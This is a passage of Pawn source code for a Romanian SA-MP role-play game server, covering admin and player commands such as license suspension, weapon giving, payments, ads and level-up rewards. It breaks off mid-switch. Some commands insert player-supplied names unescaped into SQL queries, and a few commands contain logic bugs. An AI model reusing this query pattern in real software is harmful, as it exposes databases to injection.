cmd:disarmrange(playerid, params[]) {
    if !IsAdmin(playerid, 3) *then 
    	return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);

	new range, Float:x, Float:y, Float:z;
	if(sscanf(params, "i", range)) return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/disarmrange <Range>");
	foreach(new i : logged_players)  {
		if(IsPlayerInRangeOfPoint(i,range*1000,x,y,z)) ResetWeapons(i);
	}
	format(gString, 128, "AdmCmd: %s a dat disarm pe o raza de %dm.", GetName(playerid), range);
	if(!Iter_Contains(Acovers, playerid)) SendAdminMessage(COLOR_LIGHTRED, gString, 3);
	return true;
}

cmd:disarm(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then 
		return SendClientMessage(playerid, COLOR_WHITE,AdminOnly);

	extract params -> new player:id; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/disarm <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Player not logged.");

	ResetWeapons(id); gString[0] = (EOS);
	format(gString, 128, "AdmCmd: %s i-a luat armele lui %s.", GetName(playerid), GetName(id));
	SendAdminMessage(COLOR_LIGHTRED, gString, 1);
	return true;
}
cmd:suspend(playerid, params[]) {
	if(!PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);

	extract params -> new player:id, string:item[15], hours, string:reason[32]; else {
		SendUsageMsg(playerid, "suspend [id] [license] [hours] [reason]");
		return SendClientMessage(playerid, COLOR_WHITE, "Driving, Sailing, Fly, Gun.");
	}

	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(id))return SendErrorMsg(playerid, "Acel player nu este logat!");
	if(!(0 <= hours <= 100)) return SendErrorMsg(playerid, "Invalid hours! (0-100)");
	if(PlayerInfo[id][pAdmin] != 0 && PlayerInfo[playerid][pAdmin] < 5) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda pe un admin!");

	switch(YHash(item, false)) {
		case _I<driving>: {
			PlayerInfo[id][pCarLicS] = hours; PlayerInfo[id][pCarLic] = 0; PlayerInfo[id][pCarLicT] = -1;
			_query("UPDATE `users` SET `CarLic`='0', `CarLicT`='-1', `CarLicS`='%d' WHERE `ID`='%d'", hours, PlayerInfo[id][pSQLID]);
		}
		case _I<sailing>: {
			PlayerInfo[id][pBoatLicS] = hours; PlayerInfo[id][pBoatLic] = 0; PlayerInfo[id][pBoatLicT] = -1;
			mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `BoatLic`='0', `BoatLicT`='-1', `BoatLicS`='%d' WHERE `ID`='%d'", hours, PlayerInfo[id][pSQLID]);
		}
		case _I<fly>: {
			PlayerInfo[id][pFlyLicS] = hours; PlayerInfo[id][pFlyLic] = 0; PlayerInfo[id][pFlyLicT] = -1;
			_query("UPDATE `users` SET `FlyLic`='0', `FlyLicT`='-1', `FlyLicS`='%d' WHERE `ID`='%d'", hours, PlayerInfo[id][pSQLID]);
		}
		case _I<gun>: {
			ResetPlayerWeapons(id);
			PlayerInfo[id][pGunLicS] = hours; PlayerInfo[id][pGunLic] = 0; PlayerInfo[id][pGunLicT] = -1;
			_query("UPDATE `users` SET `GunLic`='0', `GunLicT`='-1', `GunLicS`='%d' WHERE `ID`='%d'", hours, PlayerInfo[id][pSQLID]);		
		}
		default: return SendErrorMsg(playerid, "Invalid items.");
	}

	SendAdminMessage(COLOR_LIGHTRED, "Admin-ul %s i-a confiscat lui %s licenta de %s pentru %d ore, motiv: %s", 1, GetName(playerid), GetName(id), item, hours, reason);
	va_SendClientMessage(id, COLOR_YELLOW, "Admin %s ti-a confiscat licenta de %s pentru %d ore.", GetName(playerid), item, hours);
	return true;
}
cmd:suspendo(playerid, params[]) {
	if(!PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);

	extract params -> new string:id[24], string:item[15], hours, string:reason[32]; else {
		SendUsageMsg(playerid, "suspendo [name] [license] [hours] [reason]");
		return SendClientMessage(playerid, COLOR_WHITE, "Driving, Sailing, Fly, Gun.");
	}

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", id);
	mysql_tquery(SQL, gQuery, #suspend_player_lic, #issis, playerid, id, item, hours, reason);
	return true;
}

redist::suspend_player_lic(playerid, const id[], const item[], hours, const reason[]) {
	if(!cache_num_rows()) return SendErrorMsg(playerid, "Acest cont nu a fost gasit in baza de date!");

	new status= -1;
	cache_get_value_name_int(0, "Status", status);

	if(status != -1) return SendErrorMsg(playerid, "Acest jucator este deja conectat pe server!");
	if(!(0 <= hours <= 100)) return SendErrorMsg(playerid, "Invalid hours! (0-100)");

	switch YHash(item) do {
		case _H<driving>: _query("UPDATE `users` SET `CarLic`='0', `CarLicT`='-1', `CarLicS`='%d' WHERE `name`='%s'", hours, id);
		case _H<sailing>: _query("UPDATE `users` SET `BoatLic`='0', `BoatLicT`='-1', `BoatLicS`='%d' WHERE `name`='%s'", hours, id);
		case _H<fly>: _query("UPDATE `users` SET `FlyLic`='0', `FlyLicT`='-1', `FlyLicS`='%d' WHERE `name`='%s'", hours, id);
		case _H<gun>: _query("UPDATE `users` SET `GunLic`='0', `GunLicT`='-1', `GunLicS`='%d' WHERE `name`='%s'", hours, id);	
		default: return SendErrorMsg(playerid, "Invalid items.");
	}

	SendAdminMessage(0xFFADADFF, "Admin-ul %s i-a confiscat lui %s (offline) licenta de %s pentru %d ore, motiv: %s", 1, GetName(playerid), id, item, hours, reason);
	return true;
}

cmd:agl(playerid, params[]) {
    if(!PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);

	extract params -> new player:id, string:item[15]; else {
		SendUsageMsg(playerid, "agl [id] [license]");
		return SendClientMessage(playerid, COLOR_WHITE, "Valabile: Driving, Fly, Sailing, Gun, All.");
	}
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");

	switch(YHash(item)) {
		case _I<driving>: {
			PlayerInfo[id][pCarLic] = 1; PlayerInfo[id][pCarLicT] = 100; PlayerInfo[id][pCarLicS] = 0;
			_query("UPDATE users SET `CarLic`='1',`CarLicT`='%i',`CarLicS`='0' WHERE `ID`='%d'", PlayerInfo[id][pCarLicT], PlayerInfo[id][pSQLID]);
		}
		case _I<fly>: {
			PlayerInfo[id][pFlyLic] = 1; PlayerInfo[id][pFlyLicT] = 100; PlayerInfo[id][pFlyLicS] = 0;
			_query("UPDATE users SET `FlyLic`='1',`FlyLicT`='%i',`FlyLicS`='0' WHERE `ID`='%d'",gettime()+(20*86400),PlayerInfo[id][pSQLID]);
		}
		case _I<sailing>: {
			PlayerInfo[id][pBoatLic] = 1; PlayerInfo[id][pBoatLicT] = 100; PlayerInfo[id][pBoatLicS] = 0;
			_query("UPDATE users SET `BoatLic`='1',`BoatLicT`='%i',`BoatLicS`='0' WHERE `ID`='%d'", PlayerInfo[id][pBoatLicT], PlayerInfo[id][pSQLID]);
		}
		case _I<gun>: {
			PlayerInfo[id][pGunLic] = 1; PlayerInfo[id][pGunLicT] = 100; PlayerInfo[id][pGunLicS] = 0;
			_query("UPDATE users SET `GunLic`='1',`GunLicT`='%i', `GunLicS`='0' WHERE `ID`='%d'", gettime()+(20*76400), PlayerInfo[id][pSQLID]);
		}
		case _H<all>: {
			PlayerInfo[id][pGunLic] = PlayerInfo[id][pBoatLic] = PlayerInfo[id][pFlyLic] = PlayerInfo[id][pCarLic] = 1;
			PlayerInfo[id][pGunLicS] = PlayerInfo[id][pBoatLicS]= PlayerInfo[id][pFlyLicS] = PlayerInfo[id][pCarLicS] = 0;
			PlayerInfo[id][pGunLicT] = PlayerInfo[id][pBoatLicT] = PlayerInfo[id][pFlyLicT] = PlayerInfo[id][pCarLicT] = 100;
			_query("UPDATE users SET `CarLic`='1',`CarLicT`='%i',`CarLicS`='0',`GunLic`='1',`GunLicT`='%i',`GunLicS`='0',`BoatLic`='1',`BoatLicT`='%i',`BoatLicS`='0',`FlyLic`='1',`FlyLicT`='%i',`FlyLicS`='0' WHERE `ID`='%d'", PlayerInfo[id][pCarLicT], PlayerInfo[id][pGunLicT], PlayerInfo[id][pBoatLicT], PlayerInfo[id][pFlyLicT], PlayerInfo[id][pSQLID]);
		}
		default: {
			SendUsageMsg(playerid, "agl [id] [license]");
			SendClientMessage(playerid, COLOR_WHITE, "Valabile: Driving, Fly, Sailing, Gun, All.");
		}
	}
	va_SendClientMessage(playerid, COLOR_LIGHTBLUE,  "I-ai dat licenta de %s lui %s.",GetName(id), item);
    va_SendClientMessage(id, COLOR_LIGHTBLUE, "Admin-ul %s ti-a dat licenta de %s.",GetName(playerid), item);
    return true;
}

cmd:anno(playerid, params[]) {
	if(!PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);
	extract params -> new string:text[128]; else return SendUsageMsg(playerid, "anno [text]");
	if(FaceReclama(text)) return RemoveFunction(playerid, text), Reclama(playerid, text);
	return va_SendClientMessageToAll(COLOR_CLIENT, "(( Admin %s: %s ))", GetName(playerid), text);
}


cmd:yo(playerid, params[]) {
	if !IsAdmin(playerid, 1) && !PlayerInfo[playerid][pYouTuber] *then 
		return true;

	new time = delay_yo[playerid] - gettime();
	if(delay_yo[playerid]) return SCMf(playerid, COLOR_LGREEN, "Mai poti utiliza aceasta comanda peste %d minute (%d secunde).", ((time/60) % 60), time % 60);

	extract params -> new string:text[128]; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/yo <text>"), SendClientMessage(playerid, -1, "INFO: Verifica {9D0000}regulamentul{FFFFFF} inainte de a publica un anunt!");

	if FaceReclama(text) *then 
		return RemoveFunction(playerid, text), Reclama(playerid, text);

	format(gString, 180, "(( {9D0000}YouTuber{FFFFFF} %s says: %s. ))", GetName(playerid), text);
	SCMTA(-1, gString);
	delay_yo[playerid]=gettime()+1800;
	UpdateVar(playerid, "delay_yo", delay_yo[playerid]);
	return true;
}

cmd:pay(playerid, params[]) {
	extract params -> new player:id, moneys; else return SendUsageMsg(playerid, "pay [id] [amount]");	

	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(moneys > 1000 && PlayerInfo[playerid][pLevel] < 3) return SendErrorMsg(playerid, "Ai nevoie de nivel 3 pentru a da mai mult de $1000.");
	if(!strcmp(GetIPP(playerid), GetIPP(id), true)) return SendErrorMsg(playerid, "Nu poti transfear bani de pe acelasi IP.");
	if(moneys < 1 || moneys > PlayerInfo[playerid][pVip] < 2 ? 2000000 : 5000000) return SendErrorMsg(playerid, PlayerInfo[playerid][pVip] < 2 ? "Poti da o suma intre 1$ si 2,000,000$." : "Poti da o suma intre 1$ si 5,000,000$.");
	if(id == playerid) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda asupra ta!");
	if(!ProxDetectorS(5.0, playerid, id)) return SendErrorMsg(playerid, "Acel player nu este langa tine.");
	if(!togTransfer[id]) return SendErrorMsg(playerid, "Acel player are transfer-ul oprit.");
	if(DeelayCommand[playerid][22] > gettime()) return DeelayTime(playerid, 22);

	if(moneys > 0 && GetPlayerCash(playerid) >= moneys) {
		if(TradeID[playerid] != -1) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
		GivePlayerCash(playerid, -moneys);
		GivePlayerCash(id, moneys);
		PlayerPlaySound(id, 1052, 0.0, 0.0, 0.0);
		DeelayCommand[playerid][22] = gettime()+30;
		format(gString, 128, "%s takes out $%s in cash and hands it to %s", GetName(playerid), FormatNumber(moneys), GetName(id));
		ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		SCMf(id, COLOR_WHITE, "%s has paid you $%s.", GetName(playerid), FormatNumber(moneys));
	}
	return true;
}
cmd:number(playerid, params[]) {
	if !PlayerInfo[playerid][pPhoneBook] *then 
		return SendClientMessage(playerid, -1, "Nu ai o carte de telefon");

	extract params -> new player:id; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/number <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");
	
	if HavePhone(id) *then SCMf(playerid, -1, "%s's phone number: %s", GetName(id), PlayerInfo[id][pPhone]);
	else SCMf(playerid, -1, "%s's phone number: None", GetName(id));
	return true;
}

stock HavePhone(playerid) return PlayerInfo[playerid][pPhone][0] != '0' && PlayerInfo[playerid][pPhone][1];

cmd:changepass(playerid, params[]) {
	if DeelayCommand[playerid][31]>gettime() *then
		return DeelayTime(playerid, 31);

	ShowPlayerDialog(playerid, DIALOG_NEWPASS,DIALOG_STYLE_INPUT, "Change password","Scrie mai jos parola pe care o ai in acest moment.","Ok","Close");
	return true;
}
cmd:ad(playerid, params[]) {
	if(DeelayCommand[playerid][34] > gettime()) return DeelayTime(playerid, 34);
	if(AdTimer[playerid] != 0) return SendErrorMsg(playerid, "Ai pus un anunt recent. Foloseste comanda /myad pentru a-l vedea.");
	if(!HavePhone(playerid)) return SendErrorMsg(playerid, "Nu ai un telefon.");
	if(PlayerInfo[playerid][pMuted] == 1) return va_SendClientMessage(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);
	if(PlayerInfo[playerid][pLevel] < 5) return SendErrorMsg(playerid, "Ai nevoie de nivel 5 pentru a da un anunt!");
	extract params ->  new string:text[128]; else return SendUsageMsg(playerid, "ad [text]");	
	if(FaceReclama(text)) return Reclama(playerid, text);

	new bool:ret=false;
	for(new i = 0, idd; i < GpsBizzType[9]; i++) {
		idd = BizzTypeID[9][i];
		if(PlayerInfo[playerid][pVip] < 2) AdTimer[playerid] = total_ads * 60; else AdTimer[playerid] = (total_ads*60)/2;
		if(!PlayerToPoint(PlayerInfo[playerid][pVip]!=3?10.0:3000.0, playerid, BizzInfo[idd][bEntranceX], BizzInfo[idd][bEntranceY], BizzInfo[idd][bEntranceZ])) continue;
		if(GetPlayerCash(playerid) < BizzInfo[idd][bFee]) return va_SendClientMessage(playerid, -1, "* Ai folosit %d caractere si anuntul costa $%s, Nu ai banii necesari", strlen(params), FormatNumber(BizzInfo[idd][bFee]));
		
		CheckMission(playerid, 22); GivePlayerCash(playerid, -BizzInfo[idd][bFee]);
	
		va_GameTextForPlayer(playerid, "~r~Ai platit $%d~n~~w~Mesajul contine: %d caractere", 5000, 5, BizzInfo[idd][bFee], strlen(text));
		SendStaffMessage(0x22A60EFF, "{FF6E68}[Preview Ad] {22A60E}by %s ({FFFFFF}%d{22A60E}): %s", GetName(playerid), playerid, text);
		va_SendClientMessage(playerid, -1, "Anuntul tau va fi afisat in %d minute (%d secunde).", AdTimer[playerid]/60, AdTimer[playerid]);

		format(AdText[playerid], 256, text);
		BizzInfo[idd][bBalance] += BizzInfo[idd][bFee]; ret=true; DeelayCommand[playerid][34] = gettime()+90; total_ads++;
		break;
	}
	if(!ret) SendErrorMsg(playerid, "Nu esti la CNN.");
	return true;
}

redist::Advertisment(playerid) {
	va_SendClientMessageToAll(0x00D900FF, "Ad by %s (phone: {FFFFFF}%s{00D900}): %s",GetName(playerid),PlayerInfo[playerid][pPhone],AdText[playerid]);
	AdTimer[playerid] = 0; total_ads--;
	return true;
}

cmd:as(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then 
		return true;

	if PlayerInfo[playerid][pMuted] == 1 *then 
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	extract params -> new string:result[144]; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/as(hout) <text>");

	if FaceReclama(result) *then 
		return Reclama(playerid, result);

	format(gString, 160, "(( Admin %s says: %s ))", GetName(playerid), result);
	ProxDetector(200.0, playerid, gString, COLOR_YELLOW);
	return true;
}
cmd:s(playerid, params[]) {
	if PlayerInfo[playerid][pMuted] == 1 *then
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)", PlayerInfo[playerid][pMuteTime]);

	extract params -> new string:result[144]; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/s(hout) <text>");

	if FaceReclama(result) *then 
		return Reclama(playerid, result);

	format(gString, 160, "%s striga: %s", GetName(playerid), result);
	ProxDetector(30.0, playerid, gString,COLOR_WHITE);
	return true;
}
cmd:unrentroom(playerid, params[]) {
	if(PlayerInfo[playerid][pHouse] != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) return SendClientMessage(playerid, COLOR_WHITE, "Detii o casa.");
	if(PlayerInfo[playerid][pRented] == -1) return SendClientMessage(playerid, COLOR_GREY, "Nu ai chirie.");
	PlayerInfo[playerid][pHouse] = 999;
	PlayerInfo[playerid][pRented] = -1;
	SendClientMessage(playerid, COLOR_WHITE, "Nu mai ai chirie.");
	_query("UPDATE `users` SET `House` = '%i', `Rented` = '%i' WHERE `id` = '%i'", PlayerInfo[playerid][pHouse], PlayerInfo[playerid][pRented], PlayerInfo[playerid][pSQLID]);
	return true;
}
cmd:time(playerid, params[]) {
	gettime(params[0], params[1], params[2]);
	SCMf(playerid, COLOR_WHITE, "The current time is %d:%d:%d", params[0], params[1], params[2]);
 	SCMf(playerid, COLOR_WHITE, "Connected for %.0f minutes (%.0f seconds).", PlayerInfo[playerid][pSeconds]/60, PlayerInfo[playerid][pSeconds]);
 	format(gString, 128, "* %s raises her hand and looks down at her watch.", GetName(playerid));
	ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
	ApplyAnimation(playerid,"COP_AMBIENT","Coplook_watch",4.1,0,0,0,0,0);
	return true;
}

cmd:givegun(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3) return SendErrorMsg(playerid, AdminOnly);
	
	extract params -> new player:id, gunid, ammo; else return SendUsageMsg(playerid, "givegun [id] [gun id] [ammo]");
	
	if(!(0 <= gunid <= 46)) return SendErrorMsg(playerid, "Invalid Weapon ID");	
	if(!IsPlayerConnected(id)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!PlayerInfo[id][pGunLic]) return SendErrorMsg(playerid, "Acel player nu are licenta de arme.");
	ServerWeapon(id, gunid, ammo);
    
	new gunname[32]; 
	if(!Iter_Contains(Acovers, playerid)) SendAdminMessage(COLOR_LIGHTRED, "Admin %s has given weapon %s to %s with %d bullets.", 1, GetName(playerid),GetName(id), GetWeaponName(gunid, gunname, 32), ammo);
	if(GetPlayerState(id) == PLAYER_STATE_PASSENGER) {
		new gun2,tmp;
		GetPlayerWeaponData(id,5,gun2,tmp);
		#pragma unused tmp
		if(gun2)SetPlayerArmedWeapon(id,gun2);
		else SetPlayerArmedWeapon(id,0);
	}
	return true;
}

cmd:use(playerid, params[]) {
	if UsingDrugs[playerid] != 0 *then 
		return SendClientMessage(playerid, COLOR_WHITE, "Te droghezi deja!");

	if PaintType[playerid] != 0 *then 
		return SendClientMessage(playerid, -1, "Nu poti folosi aceasta comanda in paintball!");

	if IsPlayerInAnyVehicle(playerid) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi droguri dintr-un vehicul!");

	extract params -> new string:drugs[32]; else
		return usage(playerid, "use <drug/heroin>");

	switch YHash(drugs, false) do {
		case _H<drug>: {
			if(PlayerInfo[playerid][pDrugs] < 1000) return SendClientMessage(playerid, COLOR_GREY, "Nu ai destule droguri.");
			PlayerStoned[playerid] += 2;
			Freezed[playerid] = 1;
			CheckMission(playerid, 7);
			format(gString, 128, "%s has just took some drugs.", GetName(playerid));
			ProxDetector(20.0, playerid, gString, COLOR_PURPLE);
			SendClientMessage(playerid, COLOR_WHITE, "Asteapta 30 de secunde pentru a isi face efectul.");
			UsingDrugs[playerid] = 1;
			drug[playerid] = SetTimerEx("DrugEffectGone", 30000, false,"d", playerid);
			LoopingAnim(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);		
		}
		case _H<heroin>: {

		}
		default: return SendClientMessage(playerid, COLOR_LGREEN, "Invalid item! /use <drug/heroin>");
	}
	return true;
}

redist::DrugEffectGone(playerid) {
	if(IsPlayerConnected(playerid) && UsingDrugs[playerid] == 1) {		
		UsingDrugs[playerid] = 0;
		ClearAnimations(playerid);
		SetPlayerDrunkLevel (playerid, 0);
		PlayerStoned[playerid] = 0;
		KillTimer(drug[playerid]);
		Freezed[playerid] = 0;
		SetPlayerHealthEx(playerid, 99);
		PlayerInfo[playerid][pDrugs] -= 1;	
		_query("UPDATE users SET `Drugs`='%d' WHERE `ID`='%d'",PlayerInfo[playerid][pDrugs],PlayerInfo[playerid][pSQLID]);
	}
	return true;
}

cmd:gotohouse(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1) 
		return SendClientMessage(playerid,COLOR_WHITE,AdminOnly);

	if(sscanf(params, "d", params[0])) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/house <House ID>");

	if(params[0] > sizeof(HouseInfo)) 
		return SendClientMessage(playerid, COLOR_GREY, "ID Invalid!");

	SetPlayerInterior(playerid,HouseInfo[params[0]][hInterior]);
	SetPlayerPos(playerid,HouseInfo[params[0]][hExitx],HouseInfo[params[0]][hExity],HouseInfo[params[0]][hExitz]);
	InInterior[playerid] = HOUSE_INTERIOR;
	InInteriorID[playerid] = params[0];
	SetPlayerVirtualWorld(playerid,HouseInfo[params[0]][hVirtual]);
	format(gString, 128, "%s used /gotohouse %d.", GetName(playerid), params[0]);
	SendAdminMessage(COLOR_ADMCHAT, gString, 1);
	return true;
}
cmd:gotobiz(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 1) 
		return SendClientMessage(playerid,COLOR_WHITE,AdminOnly);

	if(sscanf(params, "d", params[0])) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/biz <Biz ID>");

	if(params[0] > sizeof(BizzInfo)) 
		return SendClientMessage(playerid, COLOR_GREY, "ID Invalid!");

	if(BizzInfo[params[0]][bStatic] == 0) {
		SetPlayerInterior(playerid,BizzInfo[params[0]][bInterior]);
		SetPlayerPos(playerid,BizzInfo[params[0]][bExitX],BizzInfo[params[0]][bExitY],BizzInfo[params[0]][bExitZ]);	
		SetPlayerVirtualWorld(playerid,BizzInfo[params[0]][bVirtual]);
		InInterior[playerid] = BUSINESS_INTERIOR;
		InInteriorID[playerid] = params[0];
	}
	else {
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,BizzInfo[params[0]][bEntranceX],BizzInfo[params[0]][bEntranceY],BizzInfo[params[0]][bEntranceZ]);
	}
	format(gString, 128, "%s used /gotobiz %d.", GetName(playerid), params[0]);
	SendAdminMessage(COLOR_ADMCHAT, gString, 1);
	return true;
}
cmd:buylevel(playerid, params[]) {
	if(PlayerInfo[playerid][pConnectTime]<(PlayerInfo[playerid][pLevel] * 2.0)) return SCMf(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de %d ore jucate pentru a putea avansa in level!", PlayerInfo[playerid][pLevel] * 2);
	if(GetPlayerCash(playerid) < PlayerInfo[playerid][pLevel] * 2000) return SendClientMessage(playerid,COLOR_GRAD1,"Nu ai banii necesari.");
	if(PlayerInfo[playerid][pExp] < PlayerInfo[playerid][pLevel] * 3) return SendClientMessage(playerid,COLOR_GRAD1,"Nu ai destule RP-uri.");
	GivePlayerCash(playerid, -(PlayerInfo[playerid][pLevel] * 2000));
	PlayerInfo[playerid][pExp] -= PlayerInfo[playerid][pLevel] * 3;
	PlayerInfo[playerid][pLevel]++;
	SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
	UpdateProgress(playerid, 0);
	SCMf(playerid, COLOR_LIGHTBLUE, "Felicitari! Acum, ai nivel %d.",PlayerInfo[playerid][pLevel]);
	givePoints(playerid, 10);
	givePetPoint(playerid, PlayerInfo[playerid][pLevel] * 25);

	format(gString, sizeof gString, "A avansat in level %d (%d/%d RP)", PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pExp], (PlayerInfo[playerid][pLevel] - 1) * 3);
	InsertLog(playerid, gString, LOG_LEVEL);

	gString[0] = (EOS);

	if(random(100) > 50) {
		SendClientMessage(playerid, COLOR_YELLOW, "Ai primit un punct premium drept bonus!");
		PlayerInfo[playerid][pPremiumPoints]++;
		UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
	}
	
	UpdateVar(playerid, "Level", PlayerInfo[playerid][pLevel]);
	UpdateVar(playerid, "Respect", PlayerInfo[playerid][pExp]);
	if(PlayerInfo[playerid][pReferral] != 0) {
		new money, rp;			
		if(PlayerInfo[playerid][pLevel] <= 3)  money = 10000*PlayerInfo[playerid][pLevel];
		else if(PlayerInfo[playerid][pLevel] > 3 && PlayerInfo[playerid][pLevel] < 10)  money = 15500*PlayerInfo[playerid][pLevel], rp = PlayerInfo[playerid][pLevel]/2-1;
		else money = 20000*PlayerInfo[playerid][pLevel], rp = PlayerInfo[playerid][pLevel]/2+2;
					
		PlayerInfo[playerid][pReferralRP] += rp;
		PlayerInfo[playerid][pReferralMoney] += money;
		UpdateVar(playerid, "ReferralRP", PlayerInfo[playerid][pReferralRP]);
		UpdateVar(playerid, "ReferralMoney", PlayerInfo[playerid][pReferralMoney]);
	
		gQuery[0] = (EOS);
		mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `id`='%d'", PlayerInfo[playerid][pReferral]);
		mysql_tquery(SQL, gQuery, "SQL_check_referral", "iii", playerid, money, rp);

		mysql_format(SQL, gQuery, sizeof gQuery, "UPDATE `users` SET `Bank`=`Bank`+'%i', `Respect`=`Respect`+'%i' WHERE `id`='%i'", money, rp, PlayerInfo[playerid][pReferral]);
		mysql_tquery(SQL, gQuery);
	}

	if(PlayerInfo[playerid][pReferral] || PlayerInfo[playerid][pReborn]) {
		switch(PlayerInfo[playerid][pLevel]) {
			case 10: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un Rare Crate pentru ca ai deblocat level 10!");
				PlayerInfo[playerid][pCrates][0] ++;
				save_crates(playerid);
			}
			case 15: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un Epic Crate pentru ca ai deblocat level 15!");
				PlayerInfo[playerid][pCrates][1] ++;
				save_crates(playerid);
			}
			case 20: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un Legendary Crate pentru ca ai deblocat level 20!");
				PlayerInfo[playerid][pCrates][2] ++;
				save_crates(playerid);
			}
			case 25: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un Hidden Color pentru ca ai deblocat level 25!");
				PlayerInfo[playerid][pHidden] ++;
				UpdateVar(playerid, "Hidden", PlayerInfo[playerid][pHidden]);
			}
			case 30: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit 20 puncte premium pentru ca ai deblocat level 30!");
				PlayerInfo[playerid][pPremiumPoints] += 20;
				UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			}
			case 35: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un vehicle slot pentru ca ai deblocat level 35!");
				if(PlayerInfo[playerid][pSlot] < MAX_PLAYER_VEHICLE) PlayerInfo[playerid][pSlot] ++;
				UpdateVar(playerid, "Slot", PlayerInfo[playerid][pSlot]);
			}
			case 40: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un 2x Legendary Crate pentru ca ai deblocat level 40!");
				PlayerInfo[playerid][pCrates][2] += 2;
				save_crates(playerid);
			}
			case 45: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un 3x Legendary Crate pentru ca ai deblocat level 45!");
				PlayerInfo[playerid][pCrates][2] += 3;
				save_crates(playerid);
			}
			case 50: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit 50 puncte premium pentru ca ai deblocat level 50!");
				PlayerInfo[playerid][pPremiumPoints] += 50;
				UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			}
			case 55: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit 500 BPoints pentru ca ai deblocat level 55!");
				PlayerInfo[playerid][pBPoints] += 500;
				UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);
			}
			case 60: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un Transcendent Crate pentru ca ai deblocat level 60!");
				PlayerInfo[playerid][pCrates][4] ++;
				save_crates(playerid);
			}
			case 65: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un Mythic Crate pentru ca ai deblocat level 65!");
				PlayerInfo[playerid][pCrates][3] ++;
				save_crates(playerid);
			}
			case 70: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un 2000 Pet Points pentru ca ai deblocat level 70!");
				givePetPoint(playerid, 2000);
			}
			case 75: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un Legendary Crate pentru ca ai deblocat level 75!");
				PlayerInfo[playerid][pCrates][2] ++;
				save_crates(playerid);
			}
			case 80: {
